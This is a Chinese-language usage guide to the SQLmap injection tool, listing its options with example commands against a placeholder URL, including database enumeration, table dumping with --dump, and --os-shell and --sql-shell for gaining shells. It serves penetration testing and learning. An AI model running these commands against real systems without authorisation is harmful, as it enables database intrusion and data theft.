# **SQLmap** 

是一个开源的自动化 SQL 注入和数据库接管工具，用于检测和利用 SQL 注入漏洞。它支持多种数据库管理系统（DBMS），如 MySQL、PostgreSQL、Oracle、Microsoft SQL Server 等。SQLmap 提供了丰富的功能来帮助安全研究人员和渗透测试人员进行数据库漏洞分析和利用。

### **主要功能**

1. **检测 SQL 注入**：
   - 自动检测 Web 应用程序中的 SQL 注入漏洞。
2. **数据库指纹识别**：
   - 确定目标数据库管理系统的类型和版本。
3. **数据库结构提取**：
   - 提取数据库中的表、列、数据等信息。
4. **数据提取**：
   - 从受影响的数据库中提取敏感数据。
5. **数据库用户和权限管理**：
   - 识别和操作数据库用户、权限和角色。
6. **数据库操作**：
   - 执行任意 SQL 查询、创建/删除数据库对象等。

### **基本用法**

SQLmap 的基本命令格式如下：

```
sqlmap -u [URL] [options]
```

### **常用参数**

#### **1. URL 和目标**

- `-u [URL]`

  :

  - **说明**: 指定要测试的 URL。URL 应包含参数，SQLmap 将尝试在这些参数中注入 SQL 代码。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1"
    ```

#### **2. 指定参数**

- `-p [param]`

  :

  - **说明**: 指定要测试的参数。如果不指定，SQLmap 将测试所有可能的参数。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" -p id
    ```

#### **3. 数据库信息**

- **`--dbs`**:

  - **说明**: 列出目标数据库中的所有数据库。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
    ```

- **`-D [database]`**:

  - **说明**: 指定要操作的数据库。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase --tables
    ```

- **`--tables`**:

  - **说明**: 列出指定数据库中的所有表。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase --tables
    ```

- **`-T [table]`**:

  - **说明**: 指定要操作的表。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase -T mytable --columns
    ```

- **`--columns`**:

  - **说明**: 列出指定表中的所有列。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase -T mytable --columns
    ```

- **`-C [column]`**:

  - **说明**: 指定要操作的列。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase -T mytable -C mycolumn --dump
    ```

- **`--dump`**:

  - **说明**: 从指定表中提取数据。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase -T mytable --dump
    ```

#### **4. 注入类型**

- **`--technique [techniques]`**:

  - **说明**: 指定 SQL 注入技术进行测试。可以选择 `B` (Blind)，`E` (Error-based)，`U` (Union-based)，`S` (Stacked queries)，`T` (Time-based)。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=BEUST
    ```

- **`--risk [level]`**:

  - **说明**: 设置测试风险级别，范围从 1 到 3，较高级别可能会对目标产生更大的影响。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --risk=3
    ```
  
- **`--level [level]`**:

  - **说明**: 设置测试的详细程度，范围从 1 到 5，较高级别会进行更多的测试。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --level=5
    ```

#### **5. 认证和代理**

- **`--auth-type [type]`**:

  - **说明**: 指定认证类型，如 `Basic`、`Digest`、`NTLM` 等。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --auth-type=Basic --auth-cred="user:pass"
    ```

- **`--proxy [proxy]`**:

  - **说明**: 使用代理服务器进行测试。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"
    ```

- **`--cookie [cookie]`**:

  - **说明**: 使用指定的 cookie 进行认证。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --cookie="SESSIONID=abcd1234"
    ```

#### **6. 数据库管理**

- **`--os-shell`**:

  - **说明**: 如果 SQL 注入漏洞允许，尝试获取操作系统 shell。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell
    ```

- **`--sql-shell`**:

  - **说明**: 如果 SQL 注入漏洞允许，尝试获取 SQL shell。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell
    ```

- **`--dbms [dbms]`**:

  - **说明**: 指定数据库管理系统类型。如果自动检测不准确，可以手动指定。

  - 示例

    :

    ```
    sqlmap -u "http://example.com/vulnerable.php?id=1" --dbms=mysql
    ```

### **常见使用示例**

1. **检测 SQL 注入**：

   - 检测 URL 中的 SQL 注入漏洞：

     ```
     sqlmap -u "http://example.com/vulnerable.php?id=1"
     ```

2. **提取数据库列表**：

   - 列出目标中的所有数据库：

     ```
     sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
     ```

3. **提取表和列信息**：

   - 列出指定数据库中的所有表：

     ```
     sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase --tables
     ```

   - 列出指定表中的所有列：

     ```
     sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase -T mytable --columns
     ```

4. **提取数据**：

   - 从指定表中提取所有数据：

     ```
     sqlmap -u "http://example.com/vulnerable.php?id=1" -D mydatabase -T mytable --dump
     ```

5. **使用代理进行测试**：

   - 通过指定代理服务器进行测试：

     ```
     sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"
     ```

6. **使用 cookie 进行认证**：

   - 使用指定的 cookie 进行测试：

     ```
     sqlmap -u "http://example.com/vulnerable.php?id=1" --cookie="SESSIONID=abcd1234"
     ```











